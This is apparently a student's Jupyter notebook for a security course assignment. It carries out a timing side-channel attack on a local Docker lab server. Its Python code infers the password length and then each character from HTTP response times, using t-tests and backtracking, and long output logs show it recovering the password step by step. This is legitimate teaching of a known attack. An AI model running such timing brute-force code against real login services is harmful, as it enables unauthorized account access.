# %% [markdown]
# # Attacks on Implementations of Secure Systems Assignment 1

# %% [markdown]
# ## Commands used for docker
# ```bash
# docker pull amarmic/attacks_on_implementations:Assignment1_x86_64
# docker run --name ass1 -p 80:8080 amarmic/attacks_on_implementations:Assignment1_x86_64
# ```
#
# ## Commands used for Anaconda to test locally
# ```bash
# conda create --name side_attacks python=3.12
# conda install requests
# ```

# %% [markdown]
# ### Imports

# %%
# %pip install scipy
# %pip install requests
# Out:
# Collecting scipy
#   Downloading scipy-1.15.2-cp313-cp313-win_amd64.whl.metadata (60 kB)
# Collecting numpy<2.5,>=1.23.5 (from scipy)
#   Downloading numpy-2.2.4-cp313-cp313-win_amd64.whl.metadata (60 kB)
# Downloading scipy-1.15.2-cp313-cp313-win_amd64.whl (41.0 MB)
#    ---------------------------------------- 0.0/41.0 MB ? eta -:--:--
#    - -------------------------------------- 1.0/41.0 MB 6.0 MB/s eta 0:00:07
#    ---- ----------------------------------- 4.5/41.0 MB 12.8 MB/s eta 0:00:03
#    -------- ------------------------------- 8.4/41.0 MB 15.1 MB/s eta 0:00:03
#    ------------- -------------------------- 13.4/41.0 MB 17.4 MB/s eta 0:00:02
#    ---------------- ----------------------- 17.3/41.0 MB 17.9 MB/s eta 0:00:02
#    --------------------- ------------------ 22.0/41.0 MB 18.9 MB/s eta 0:00:02
#    ------------------------- -------------- 26.0/41.0 MB 18.9 MB/s eta 0:00:01
#    ---------------------------- ----------- 29.4/41.0 MB 18.6 MB/s eta 0:00:01
#    -------------------------------- ------- 33.0/41.0 MB 18.4 MB/s eta 0:00:01
#    ----------------------------------- ---- 36.7/41.0 MB 18.5 MB/s eta 0:00:01
#    ---------------------------------------  40.9/41.0 MB 18.6 MB/s eta 0:00:01
#    ---------------------------------------- 41.0/41.0 MB 18.4 MB/s eta 0:00:00
# Downloading numpy-2.2.4-cp313-cp313-win_amd64.whl (12.6 MB)
#    ---------------------------------------- 0.0/12.6 MB ? eta -:--:--
#    ------------ --------------------------- 3.9/12.6 MB 20.3 MB/s eta 0:00:01
#    --------------------------- ------------ 8.7/12.6 MB 22.2 MB/s eta 0:00:01
#    ---------------------------------------- 12.6/12.6 MB 22.3 MB/s eta 0:00:00
# Installing collected packages: numpy, scipy
# Successfully installed numpy-2.2.4 scipy-1.15.2
# Collecting requests
#   Downloading requests-2.32.3-py3-none-any.whl.metadata (4.6 kB)
# Collecting charset-normalizer<4,>=2 (from requests)
#   Downloading charset_normalizer-3.4.1-cp313-cp313-win_amd64.whl.metadata (36 kB)
# Collecting idna<4,>=2.5 (from requests)
#   Downloading idna-3.10-py3-none-any.whl.metadata (10 kB)
# Collecting urllib3<3,>=1.21.1 (from requests)
#   Downloading urllib3-2.3.0-py3-none-any.whl.metadata (6.5 kB)
# Collecting certifi>=2017.4.17 (from requests)
#   Downloading certifi-2025.1.31-py3-none-any.whl.metadata (2.5 kB)
# Downloading requests-2.32.3-py3-none-any.whl (64 kB)
# Downloading certifi-2025.1.31-py3-none-any.whl (166 kB)
# Downloading charset_normalizer-3.4.1-cp313-cp313-win_amd64.whl (102 kB)
# Downloading idna-3.10-py3-none-any.whl (70 kB)
# Downloading urllib3-2.3.0-py3-none-any.whl (128 kB)
# Installing collected packages: urllib3, idna, charset-normalizer, certifi, requests
# Successfully installed certifi-2025.1.31 charset-normalizer-3.4.1 idna-3.10 requests-2.32.3 urllib3-2.3.0

# %%
import requests
import time
from scipy import stats

# %% [markdown]
# ### Constants

# %%
base_url = "http://localhost"
name = "208009845"
difficulty = "1" # const for first difficuly
max_PASSWORD_LENGTH = 32
amount_of_repeats = 3
possible_chars = "abcdefghijklmnopqrstuvwxyz"

# %% [markdown]
# ## Solution for difficulty 1
# With difficulty 1, the password length is variable, so we need first to find the length.

# %%
password = "parshandata"
response = requests.get(f"{base_url}/?user={name}&password={password}")
print("Response: ", response.url)
if response.status_code != 200 : # sanity check
  print("Error: ", response.status_code)

if response.text == "1":
   print("correct password")
else:
   print("incorrect password")
# Out:
# Response:  http://localhost/?user=208009845&password=parshandata
# correct password

# %%
# Find length of password
# here we save the time of the query for each password length
vector_iterations = [[] for _ in range(max_PASSWORD_LENGTH-1)]
for PASSWORD_LENGTH in range(1,max_PASSWORD_LENGTH): 
  password = "a" * PASSWORD_LENGTH
  for iteration in range(amount_of_repeats):
    start = time.time()
    response = requests.get(f"{base_url}/?user={name}&password={password}")#&difficulty={difficulty}")
    end = time.time()
    if response.status_code != 200: # sanity check
      print("Error: ", response.status_code)
      break
    time_of_query = end - start
    vector_iterations[PASSWORD_LENGTH-1].append(time_of_query)

# calculate avg time for each password length
PASSWORD_LENGTH, max_avg = 0, 0
for i in range(len(vector_iterations)):
  vector_iterations[i] = sum(vector_iterations[i]) / len(vector_iterations[i])
  if vector_iterations[i] > max_avg:
    max_avg = vector_iterations[i]
    PASSWORD_LENGTH = i+1
  
print(f"Password length: {PASSWORD_LENGTH}, Time: {vector_iterations[PASSWORD_LENGTH-1]}")
# Out:
# Password length: 11, Time: 0.5066157182057699

# %%
import numpy as np

min_letters = 5
alpha = 0.0005
amount_of_repeats = 3

def majority_t_test(data, popmean):
  majority_list = []
  for iteration in range(amount_of_repeats):
    if t_test(data, popmean[iteration]):
      majority_list.append(True)
    else:
      majority_list.append(False)
  if majority_list.count(True) > amount_of_repeats // 2:
    return True
  return False
  
def t_test(data, popmean):
  flat_list = [item for sublist in data for item in sublist]
  t_stat, p_val = stats.ttest_1samp(flat_list, popmean, alternative='less')
  if p_val < alpha:
    return True
  return False

def remove_outliers(data):
    q25, q75 = np.percentile(data, 25), np.percentile(data, 75)
    iqr = q75 - q25
    return [x for x in data if (x <= q75 + 1.5 * iqr)]


def get_dynamic_alpha(password_so_far, min_alpha=0.005, max_alpha=0.0001):
    """
    Calculate a dynamic alpha value that becomes more strict as we discover more characters.
    
    Args:
        password_so_far: Currently discovered partial password
        min_alpha: Minimum allowed alpha value (lower bound)
        max_alpha: Maximum allowed alpha value (upper bound)
    
    Returns:
        Dynamically calculated alpha value
    """
    # Exponential decrease in alpha as password length increases
    # We become more strict (require stronger evidence) as we progress
    return max(min_alpha, max_alpha * (0.7 ** len(password_so_far)))
    
def find_password():
  password = "" # password to return
  while (len(password) <= PASSWORD_LENGTH):
    max_time_index, max_time = 0, 0
    vector_iterations = [[] for _ in range(len(possible_chars))]
    current_index_of_password = len(password) #what index we are trying to brute force
    for index_char_to_check in range(len(possible_chars)):
      print(possible_chars[index_char_to_check], end="") #for debugging purposes
      password_to_check = password + possible_chars[index_char_to_check] * (PASSWORD_LENGTH - current_index_of_password)
      for _ in range(amount_of_repeats):
        start = time.time()
        response = requests.get(f"{base_url}/?user={name}&password={password_to_check}")#&difficulty={difficulty}")
        end = time.time()
        if response.status_code == 200 and response.text == "1":
          return password_to_check
        vector_iterations[index_char_to_check].append(end - start)

        # perform t-test to see if it's an small outlier 
        #TODO
    
      #vector_iterations[index_char_to_check] = remove_outliers_and_avg(vector_iterations[index_char_to_check])

      


      if max(vector_iterations[index_char_to_check]) > max_time:
        max_time = max(vector_iterations[index_char_to_check])
        max_time_index = index_char_to_check
      

      if index_char_to_check == min_letters-1:
        found = False
        for i in range(min_letters):
          sample = vector_iterations[:i] + vector_iterations[i+1:min_letters]
          if majority_t_test(sample, vector_iterations[i]):
            password += possible_chars[i]
            print(f"\nPassword: {password}, time: {vector_iterations[i]}") #,p-value: {p_val}
            print(vector_iterations[:index_char_to_check+1])
            found = True
        if found: break
        else: continue

      # t-test
      if index_char_to_check > min_letters -1 and max_time_index == index_char_to_check:
        sample = vector_iterations[:index_char_to_check]
        if majority_t_test(sample, vector_iterations[index_char_to_check]):
          password += possible_chars[index_char_to_check]
          print(f"\nPassword: {password}, time: {vector_iterations[index_char_to_check]}") #,p-value: {p_val}
          print(vector_iterations[:index_char_to_check+1])
          break   
        
      
    else: #go back a letter  
        password = password[:-1]
        print("We did not find a char, the new password is: ", password)
  else:
    return "NOT_FOUND"

password = find_password()
print(f"Password: {password}")
# Out:
# ---------------------------------------------------------------------------
# NameError                                 Traceback (most recent call last)
# Cell In[4], line 105
#     102   else:
#     103     return "NOT_FOUND"
# --> 105 password = find_password()
#     106 print(f"Password: {password}")
#
# Cell In[4], line 49, in find_password()
#      47 def find_password():
#      48   password = "" # password to return
# ---> 49   while (len(password) <= password_length):
#      50     max_time_index, max_time = 0, 0
#      51     vector_iterations = [[] for _ in range(len(possible_chars))]
#
# NameError: name 'password_length' is not defined

# %%
import time
import string
import requests
from statistics import median, stdev
from datetime import datetime
from scipy import stats

BASE_URL = "http://localhost"
USERNAME = "208009845"
CHARSET = string.ascii_lowercase
CHARSET_LENGTH = 26
REPEATS = 3
MIN_SAMPLES_FOR_EARLY_STOP = 5
PASSWORD_LENGTH = 11
DIFFICULTY = 5
alpha = 0.005
MAX_PASSWORD_LENGTH = 36

# Find length of password
# here we save the time of the query for each password length
def find_password_length():
    vector_iterations = [[] for _ in range(MAX_PASSWORD_LENGTH-1)]
    for PASSWORD_LENGTH in range(1,MAX_PASSWORD_LENGTH): 
        password = "a" * PASSWORD_LENGTH
        for iteration in range(REPEATS):
            response_time, response = time_request(password)
            vector_iterations[PASSWORD_LENGTH-1].append(response_time)

    # calculate avg time for each password length
    PASSWORD_LENGTH, max_avg = 0, 0
    for i in range(len(vector_iterations)):
        vector_iterations[i] = sum(vector_iterations[i]) / len(vector_iterations[i])
        if vector_iterations[i] > max_avg:
            max_avg = vector_iterations[i]
            PASSWORD_LENGTH = i+1

    print(f"Password length: {PASSWORD_LENGTH}, Time: {vector_iterations[PASSWORD_LENGTH-1]}")
    return PASSWORD_LENGTH

def t_test(data, best_time):
    t_stat, p_val = stats.ttest_1samp(data, best_time, alternative='less')
    print(f"t-stat: {t_stat}, p-value: {p_val}")
    if p_val < alpha:
        return True
    return False

def time_request(password_guess):
    if DIFFICULTY == 0:
        url = f"{BASE_URL}/?user={USERNAME}&password={password_guess}"
    else:
        url = f"{BASE_URL}/?user={USERNAME}&password={password_guess}&difficulty={DIFFICULTY}"
    start = time.time()
    response = requests.get(url)
    end = time.time()
    return end - start, response.text.strip()

def log_result(password, password_tries, time):
    with open('results.txt','a') as f:
        now = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
        LOCAL = "localhost" in BASE_URL or "127.0.0.1" in BASE_URL
        f.write(f"name: {USERNAME}, local: {LOCAL}, password length: {PASSWORD_LENGTH}, difficulty: {DIFFICULTY}, repeats: {REPEATS}, password: {password}, time: {int(time)//60}m{int(time)%60}s, passwword tries: {password_tries}, logged at: {now}\n")

def guess_password():
    global REPEATS
    do_not_check_set = [set() for _ in range(MAX_PASSWORD_LENGTH)]
    start_time_all_password = time.time()
    guessed_password = ""
    password_tries = 0 
    check_all_letters = False
    min_margin_seconds = 0.25  # minimum difference between top 2 medians to trigger early stop
    print(f"\n[+] Guessing character at position 1")
    timings = []
    timings_per_position = []
    indexes_list = []
    for i, c in enumerate(CHARSET):
        trial = guessed_password + c + 'a' * (PASSWORD_LENGTH - len(guessed_password) - 1)
        times_list = []
        for _ in range(REPEATS):
            response_time, response = time_request(trial)
            if response == "1":
                log_result(trial, password_tries, time.time() - start_time_all_password)
                return trial
            times_list.append(pow((response_time + 5), 2))
        med_time = median(times_list)
        timings.append((med_time, c))

        print(f"    Tried '{trial}' | Median Time: {med_time:.5f}s")

    # Early stopping based on timing separation from second best
    timings = sorted(timings, reverse=True)
    best_timing, best_char = timings[0]
    second_best_timing, _ = timings[1]
    third_best_timing, _ = timings[2]
    
    min_margin_seconds = (((best_timing - second_best_timing) + (best_timing - third_best_timing)) / 2) * 0.8
    
    password_tries += (i + 1)*REPEATS
    timings_per_position.append(timings)
    if best_timing - second_best_timing > min_margin_seconds:
        print(f"[✓] Early outlier: '{best_char}' (margin {best_timing - second_best_timing:.5f}s > {min_margin_seconds}s)")
        guessed_password += best_char
    else:
        # No early stopping — pick the best overall
        indexes_list.append(0)
        best_char = max(timings, key=lambda x: x[0])[1] 

    while True:
        # for position in range(1, PASSWORD_LENGTH - 1):
        if len(guessed_password) + 1 < PASSWORD_LENGTH:
            timings = []
            if check_all_letters:
                min_margin_seconds *= 0.75
                min_samples_to_early_stop = 26
                REPEATS = REPEATS + 2
            else:
                min_samples_to_early_stop = 3 if len(guessed_password) <= 10 else 5
            print(f"\n[+] Guessing character at position {len(guessed_password) + 1}, REPEATS: {REPEATS}")
            
            for i, c in enumerate(CHARSET):
                if c in do_not_check_set[len(guessed_password)]:
                    print(f"    Skipping '{c}' (already checked)")
                    continue
                trial = guessed_password + c + 'a' * (PASSWORD_LENGTH - len(guessed_password) - 1)

                #times_list = [time_request(trial)[0] for _ in range(REPEATS)]
                times_list = []
                for _ in range(REPEATS):
                    response_time, response = time_request(trial)
                    if response == "1":
                        log_result(trial, password_tries, time.time() - start_time_all_password)
                        return trial
                    times_list.append(pow((response_time + 5), 2))
                med_time = median(times_list)
                timings.append((med_time, c))

                print(f"    Tried '{trial}' | Median Time: {med_time:.5f}s")

                # Early stopping based on timing separation from second best
                if i + 1 >= min_samples_to_early_stop:
                    timings = sorted(timings, reverse=True)
                    best_timing, best_char = timings[0]
                    second_best_timing, _ = timings[1]

                    if best_timing - second_best_timing > min_margin_seconds:
                        print(f"[✓] Early outlier: '{best_char}' (margin {best_timing - second_best_timing:.5f}s > {min_margin_seconds}s)")
                        guessed_password += best_char
                        timings_per_position.append(timings)
                        password_tries += (i + 1)*REPEATS
                        if check_all_letters:
                            REPEATS = REPEATS - 2
                            min_margin_seconds *= 1.6
                            check_all_letters = False
                        break
                if i + 1 == CHARSET_LENGTH: #didn't found any char
                    # No early stopping — pick the best overall
                    timings_per_position.append(timings)
                    best_timing, best_char = timings[0]
                    if check_all_letters:
                        min_margin_seconds *= 1.6
                        REPEATS = REPEATS - 2
                    if t_test(times_list, best_timing):
                        guessed_password += best_char   
                        password_tries += (i + 1)*REPEATS
                        check_all_letters = False
                        print(f"selected the max outlier: '{best_char}' (time: {best_timing:.5f}s, REPEATS: {REPEATS})")
                        break
                    else: 
                        check_all_letters = True
                        do_not_check_set[len(guessed_password)].add(guessed_password[-1])
                        guessed_password = guessed_password[:-1]
                        print(f"Max timing was not statistically significant, going back to position {len(guessed_password)}, REPEATS: {REPEATS})")
        else: # Last iteration
            print(f"\n[+] Guessing character at position {len(guessed_password) + 1}")

            for i, c in enumerate(CHARSET):
                trial = guessed_password + c + 'a' * (PASSWORD_LENGTH - len(guessed_password) - 1)

                _, output = time_request(trial)
                if output == "1":
                    password_tries += (i + 1)*REPEATS
                    log_result(trial, password_tries, time.time() - start_time_all_password)
                    return trial
                print(f"    Tried '{trial}'")
            check_all_letters = True
            do_not_check_set[len(guessed_password)].add(guessed_password[-1])
            guessed_password = guessed_password[:-1]
            print("Did not find the correct password, going back to position ", len(guessed_password))
            

if __name__ == "__main__":
    PASSWORD_LENGTH = find_password_length()
    password = guess_password()
    
    print(f"\n[✓] The password is {password}")

# to calculate the median instead of avg
# at first find the difference between the max and the min and define as the margin
# each time we multiply the margin by let's say 0.8/0.85
# calc at least 3 or 5 chars to determine the result
# Out:
# Password length: 16, Time: 0.16527040799458823
#
# [+] Guessing character at position 1
#     Tried 'aaaaaaaaaaaaaaaa' | Median Time: 26.50489s
#     Tried 'baaaaaaaaaaaaaaa' | Median Time: 26.44139s
#     Tried 'caaaaaaaaaaaaaaa' | Median Time: 26.38319s
#     Tried 'daaaaaaaaaaaaaaa' | Median Time: 26.35047s
#     Tried 'eaaaaaaaaaaaaaaa' | Median Time: 26.39375s
#     Tried 'faaaaaaaaaaaaaaa' | Median Time: 26.45372s
#     Tried 'gaaaaaaaaaaaaaaa' | Median Time: 26.32963s
#     Tried 'haaaaaaaaaaaaaaa' | Median Time: 26.39867s
#     Tried 'iaaaaaaaaaaaaaaa' | Median Time: 26.34043s
#     Tried 'jaaaaaaaaaaaaaaa' | Median Time: 26.46586s
#     Tried 'kaaaaaaaaaaaaaaa' | Median Time: 26.88243s
#     Tried 'laaaaaaaaaaaaaaa' | Median Time: 26.37746s
#     Tried 'maaaaaaaaaaaaaaa' | Median Time: 26.32051s
#     Tried 'naaaaaaaaaaaaaaa' | Median Time: 26.52040s
#     Tried 'oaaaaaaaaaaaaaaa' | Median Time: 26.44794s
#     Tried 'paaaaaaaaaaaaaaa' | Median Time: 26.32624s
#     Tried 'qaaaaaaaaaaaaaaa' | Median Time: 26.39109s
#     Tried 'raaaaaaaaaaaaaaa' | Median Time: 26.39005s
#     Tried 'saaaaaaaaaaaaaaa' | Median Time: 26.45988s
#     Tried 'taaaaaaaaaaaaaaa' | Median Time: 26.34867s
#     Tried 'uaaaaaaaaaaaaaaa' | Median Time: 26.49419s
#     Tried 'vaaaaaaaaaaaaaaa' | Median Time: 26.44346s
#     Tried 'waaaaaaaaaaaaaaa' | Median Time: 26.46426s
#     Tried 'xaaaaaaaaaaaaaaa' | Median Time: 26.34446s
#     Tried 'yaaaaaaaaaaaaaaa' | Median Time: 26.30655s
#     Tried 'zaaaaaaaaaaaaaaa' | Median Time: 26.38474s
# [✓] Early outlier: 'k' (margin 0.36203s > 0.29583134283616347s)
#
# [+] Guessing character at position 2, REPEATS: 3
#     Tried 'kaaaaaaaaaaaaaaa' | Median Time: 26.93871s
#     Tried 'kbaaaaaaaaaaaaaa' | Median Time: 27.47862s
#     Tried 'kcaaaaaaaaaaaaaa' | Median Time: 26.69430s
# [✓] Early outlier: 'b' (margin 0.53991s > 0.29583134283616347s)
#
# [+] Guessing character at position 3, REPEATS: 3
#     Tried 'kbaaaaaaaaaaaaaa' | Median Time: 27.33650s
#     Tried 'kbbaaaaaaaaaaaaa' | Median Time: 27.55414s
#     Tried 'kbcaaaaaaaaaaaaa' | Median Time: 27.61926s
#     Tried 'kbdaaaaaaaaaaaaa' | Median Time: 27.35997s
#     Tried 'kbeaaaaaaaaaaaaa' | Median Time: 27.32709s
#     Tried 'kbfaaaaaaaaaaaaa' | Median Time: 27.46711s
#     Tried 'kbgaaaaaaaaaaaaa' | Median Time: 27.47524s
#     Tried 'kbhaaaaaaaaaaaaa' | Median Time: 27.33808s
#     Tried 'kbiaaaaaaaaaaaaa' | Median Time: 27.36888s
#     Tried 'kbjaaaaaaaaaaaaa' | Median Time: 27.37763s
#     Tried 'kbkaaaaaaaaaaaaa' | Median Time: 27.39398s
#     Tried 'kblaaaaaaaaaaaaa' | Median Time: 27.39685s
#     Tried 'kbmaaaaaaaaaaaaa' | Median Time: 27.32065s
#     Tried 'kbnaaaaaaaaaaaaa' | Median Time: 28.32453s
# [✓] Early outlier: 'n' (margin 0.70527s > 0.29583134283616347s)
#
# [+] Guessing character at position 4, REPEATS: 3
#     Tried 'kbnaaaaaaaaaaaaa' | Median Time: 28.28850s
#     Tried 'kbnbaaaaaaaaaaaa' | Median Time: 27.91638s
#     Tried 'kbncaaaaaaaaaaaa' | Median Time: 27.78588s
# [✓] Early outlier: 'a' (margin 0.37212s > 0.29583134283616347s)
#
# [+] Guessing character at position 5, REPEATS: 3
#     Tried 'kbnaaaaaaaaaaaaa' | Median Time: 28.43084s
#     Tried 'kbnabaaaaaaaaaaa' | Median Time: 28.55519s
#     Tried 'kbnacaaaaaaaaaaa' | Median Time: 28.41876s
#     Tried 'kbnadaaaaaaaaaaa' | Median Time: 28.46363s
#     Tried 'kbnaeaaaaaaaaaaa' | Median Time: 28.40990s
#     Tried 'kbnafaaaaaaaaaaa' | Median Time: 28.53398s
#     Tried 'kbnagaaaaaaaaaaa' | Median Time: 28.43044s
#     Tried 'kbnahaaaaaaaaaaa' | Median Time: 28.33952s
#     Tried 'kbnaiaaaaaaaaaaa' | Median Time: 28.40714s
#     Tried 'kbnajaaaaaaaaaaa' | Median Time: 28.49055s
#     Tried 'kbnakaaaaaaaaaaa' | Median Time: 28.52177s
#     Tried 'kbnalaaaaaaaaaaa' | Median Time: 28.96509s
# [✓] Early outlier: 'l' (margin 0.40991s > 0.29583134283616347s)
#
# [+] Guessing character at position 6, REPEATS: 3
#     Tried 'kbnalaaaaaaaaaaa' | Median Time: 28.98646s
#     Tried 'kbnalbaaaaaaaaaa' | Median Time: 28.89704s
#     Tried 'kbnalcaaaaaaaaaa' | Median Time: 28.77115s
#     Tried 'kbnaldaaaaaaaaaa' | Median Time: 29.04992s
#     Tried 'kbnaleaaaaaaaaaa' | Median Time: 29.01484s
#     Tried 'kbnalfaaaaaaaaaa' | Median Time: 29.01464s
#     Tried 'kbnalgaaaaaaaaaa' | Median Time: 28.91367s
#     Tried 'kbnalhaaaaaaaaaa' | Median Time: 29.00918s
#     Tried 'kbnaliaaaaaaaaaa' | Median Time: 29.47484s
# [✓] Early outlier: 'i' (margin 0.42492s > 0.29583134283616347s)
#
# [+] Guessing character at position 7, REPEATS: 3
#     Tried 'kbnaliaaaaaaaaaa' | Median Time: 29.53913s
#     Tried 'kbnalibaaaaaaaaa' | Median Time: 29.47208s
#     Tried 'kbnalicaaaaaaaaa' | Median Time: 29.62635s
#     Tried 'kbnalidaaaaaaaaa' | Median Time: 29.54921s
#     Tried 'kbnalieaaaaaaaaa' | Median Time: 29.48748s
#     Tried 'kbnalifaaaaaaaaa' | Median Time: 29.43112s
#     Tried 'kbnaligaaaaaaaaa' | Median Time: 29.40481s
#     Tried 'kbnalihaaaaaaaaa' | Median Time: 29.28140s
#     Tried 'kbnaliiaaaaaaaaa' | Median Time: 29.44745s
#     Tried 'kbnalijaaaaaaaaa' | Median Time: 29.44233s
#     Tried 'kbnalikaaaaaaaaa' | Median Time: 29.50368s
#     Tried 'kbnalilaaaaaaaaa' | Median Time: 29.36307s
#     Tried 'kbnalimaaaaaaaaa' | Median Time: 29.59826s
#     Tried 'kbnalinaaaaaaaaa' | Median Time: 29.45725s
#     Tried 'kbnalioaaaaaaaaa' | Median Time: 29.60523s
#     Tried 'kbnalipaaaaaaaaa' | Median Time: 29.44054s
#     Tried 'kbnaliqaaaaaaaaa' | Median Time: 29.69803s
#     Tried 'kbnaliraaaaaaaaa' | Median Time: 29.39626s
#     Tried 'kbnalisaaaaaaaaa' | Median Time: 29.39907s
#     Tried 'kbnalitaaaaaaaaa' | Median Time: 29.43117s
#     Tried 'kbnaliuaaaaaaaaa' | Median Time: 29.50589s
#     Tried 'kbnalivaaaaaaaaa' | Median Time: 29.51559s
#     Tried 'kbnaliwaaaaaaaaa' | Median Time: 29.63159s
#     Tried 'kbnalixaaaaaaaaa' | Median Time: 29.99266s
#     Tried 'kbnaliyaaaaaaaaa' | Median Time: 29.41194s
#     Tried 'kbnalizaaaaaaaaa' | Median Time: 29.47574s
# selected the max outlier: 'x' (time: 29.99266s, REPEATS: 3)
#
# [+] Guessing character at position 8, REPEATS: 3
#     Tried 'kbnalixaaaaaaaaa' | Median Time: 30.16787s
#     Tried 'kbnalixbaaaaaaaa' | Median Time: 29.76474s
#     Tried 'kbnalixcaaaaaaaa' | Median Time: 30.48461s
# [✓] Early outlier: 'c' (margin 0.31674s > 0.29583134283616347s)
#
# [+] Guessing character at position 9, REPEATS: 3
#     Tried 'kbnalixcaaaaaaaa' | Median Time: 30.85202s
#     Tried 'kbnalixcbaaaaaaa' | Median Time: 30.37102s
#     Tried 'kbnalixccaaaaaaa' | Median Time: 30.57765s
#     Tried 'kbnalixcdaaaaaaa' | Median Time: 30.41838s
#     Tried 'kbnalixceaaaaaaa' | Median Time: 30.99035s
#     Tried 'kbnalixcfaaaaaaa' | Median Time: 30.64512s
#     Tried 'kbnalixcgaaaaaaa' | Median Time: 30.46753s
#     Tried 'kbnalixchaaaaaaa' | Median Time: 30.45787s
#     Tried 'kbnalixciaaaaaaa' | Median Time: 30.57406s
#     Tried 'kbnalixcjaaaaaaa' | Median Time: 30.38249s
#     Tried 'kbnalixckaaaaaaa' | Median Time: 30.39392s
#     Tried 'kbnalixclaaaaaaa' | Median Time: 30.57697s
#     Tried 'kbnalixcmaaaaaaa' | Median Time: 30.69559s
#     Tried 'kbnalixcnaaaaaaa' | Median Time: 30.67392s
#     Tried 'kbnalixcoaaaaaaa' | Median Time: 30.38019s
#     Tried 'kbnalixcpaaaaaaa' | Median Time: 30.73181s
#     Tried 'kbnalixcqaaaaaaa' | Median Time: 30.68792s
#     Tried 'kbnalixcraaaaaaa' | Median Time: 30.86255s
#     Tried 'kbnalixcsaaaaaaa' | Median Time: 30.36426s
#     Tried 'kbnalixctaaaaaaa' | Median Time: 30.30417s
#     Tried 'kbnalixcuaaaaaaa' | Median Time: 30.40740s
#     Tried 'kbnalixcvaaaaaaa' | Median Time: 30.56064s
#     Tried 'kbnalixcwaaaaaaa' | Median Time: 30.45563s
#     Tried 'kbnalixcxaaaaaaa' | Median Time: 30.53585s
#     Tried 'kbnalixcyaaaaaaa' | Median Time: 30.19796s
#     Tried 'kbnalixczaaaaaaa' | Median Time: 30.39840s
# selected the max outlier: 'e' (time: 30.99035s, REPEATS: 3)
#
# [+] Guessing character at position 10, REPEATS: 3
#     Tried 'kbnalixceaaaaaaa' | Median Time: 31.10293s
#     Tried 'kbnalixcebaaaaaa' | Median Time: 31.06635s
#     Tried 'kbnalixcecaaaaaa' | Median Time: 30.63415s
#     Tried 'kbnalixcedaaaaaa' | Median Time: 30.80437s
#     Tried 'kbnalixceeaaaaaa' | Median Time: 31.14234s
#     Tried 'kbnalixcefaaaaaa' | Median Time: 31.12393s
#     Tried 'kbnalixcegaaaaaa' | Median Time: 30.85524s
#     Tried 'kbnalixcehaaaaaa' | Median Time: 30.94952s
#     Tried 'kbnalixceiaaaaaa' | Median Time: 31.07956s
#     Tried 'kbnalixcejaaaaaa' | Median Time: 31.01027s
#     Tried 'kbnalixcekaaaaaa' | Median Time: 31.23940s
#     Tried 'kbnalixcelaaaaaa' | Median Time: 31.03559s
#     Tried 'kbnalixcemaaaaaa' | Median Time: 30.97692s
#     Tried 'kbnalixcenaaaaaa' | Median Time: 31.11786s
#     Tried 'kbnalixceoaaaaaa' | Median Time: 31.24327s
#     Tried 'kbnalixcepaaaaaa' | Median Time: 30.92123s
#     Tried 'kbnalixceqaaaaaa' | Median Time: 31.05440s
#     Tried 'kbnalixceraaaaaa' | Median Time: 30.95491s
#     Tried 'kbnalixcesaaaaaa' | Median Time: 31.14292s
#     Tried 'kbnalixcetaaaaaa' | Median Time: 30.85358s
#     Tried 'kbnalixceuaaaaaa' | Median Time: 31.49219s
#     Tried 'kbnalixcevaaaaaa' | Median Time: 31.09871s
#     Tried 'kbnalixcewaaaaaa' | Median Time: 31.23815s
#     Tried 'kbnalixcexaaaaaa' | Median Time: 30.95706s
#     Tried 'kbnalixceyaaaaaa' | Median Time: 31.09878s
#     Tried 'kbnalixcezaaaaaa' | Median Time: 30.90923s
# Max timing was not statistically significant, going back to position 8, REPEATS: 3)
#
# [+] Guessing character at position 9, REPEATS: 5
#     Tried 'kbnalixcaaaaaaaa' | Median Time: 30.37396s
#     Tried 'kbnalixcbaaaaaaa' | Median Time: 30.55585s
#     Skipping 'c' (already checked)
#     Tried 'kbnalixcdaaaaaaa' | Median Time: 30.68199s
#     Tried 'kbnalixceaaaaaaa' | Median Time: 31.06847s
#     Tried 'kbnalixcfaaaaaaa' | Median Time: 30.42476s
#     Tried 'kbnalixcgaaaaaaa' | Median Time: 30.46007s
#     Tried 'kbnalixchaaaaaaa' | Median Time: 30.69909s
#     Tried 'kbnalixciaaaaaaa' | Median Time: 30.49241s
#     Tried 'kbnalixcjaaaaaaa' | Median Time: 30.50787s
#     Tried 'kbnalixckaaaaaaa' | Median Time: 30.49048s
#     Tried 'kbnalixclaaaaaaa' | Median Time: 30.61369s
#     Tried 'kbnalixcmaaaaaaa' | Median Time: 30.57303s
#     Tried 'kbnalixcnaaaaaaa' | Median Time: 30.37499s
#     Tried 'kbnalixcoaaaaaaa' | Median Time: 30.47498s
#     Tried 'kbnalixcpaaaaaaa' | Median Time: 30.50205s
#     Tried 'kbnalixcqaaaaaaa' | Median Time: 30.53090s
#     Tried 'kbnalixcraaaaaaa' | Median Time: 30.60330s
#     Tried 'kbnalixcsaaaaaaa' | Median Time: 30.52272s
#     Tried 'kbnalixctaaaaaaa' | Median Time: 30.35154s
#     Tried 'kbnalixcuaaaaaaa' | Median Time: 30.77715s
#     Tried 'kbnalixcvaaaaaaa' | Median Time: 30.55894s
#     Tried 'kbnalixcwaaaaaaa' | Median Time: 30.81060s
#     Tried 'kbnalixcxaaaaaaa' | Median Time: 30.58279s
#     Tried 'kbnalixcyaaaaaaa' | Median Time: 30.44541s
#     Tried 'kbnalixczaaaaaaa' | Median Time: 30.42135s
# [✓] Early outlier: 'e' (margin 0.25787s > 0.22187350712712262s)
#
# [+] Guessing character at position 10, REPEATS: 3
#     Tried 'kbnalixceaaaaaaa' | Median Time: 30.92443s
#     Tried 'kbnalixcebaaaaaa' | Median Time: 31.15132s
#     Tried 'kbnalixcecaaaaaa' | Median Time: 31.14556s
#     Tried 'kbnalixcedaaaaaa' | Median Time: 31.13316s
#     Tried 'kbnalixceeaaaaaa' | Median Time: 30.98391s
#     Tried 'kbnalixcefaaaaaa' | Median Time: 30.97944s
#     Tried 'kbnalixcegaaaaaa' | Median Time: 31.13718s
#     Tried 'kbnalixcehaaaaaa' | Median Time: 31.10996s
#     Tried 'kbnalixceiaaaaaa' | Median Time: 31.06283s
#     Tried 'kbnalixcejaaaaaa' | Median Time: 30.95313s
#     Tried 'kbnalixcekaaaaaa' | Median Time: 31.15255s
#     Tried 'kbnalixcelaaaaaa' | Median Time: 30.96129s
#     Tried 'kbnalixcemaaaaaa' | Median Time: 31.00281s
#     Tried 'kbnalixcenaaaaaa' | Median Time: 30.99659s
#     Tried 'kbnalixceoaaaaaa' | Median Time: 31.17385s
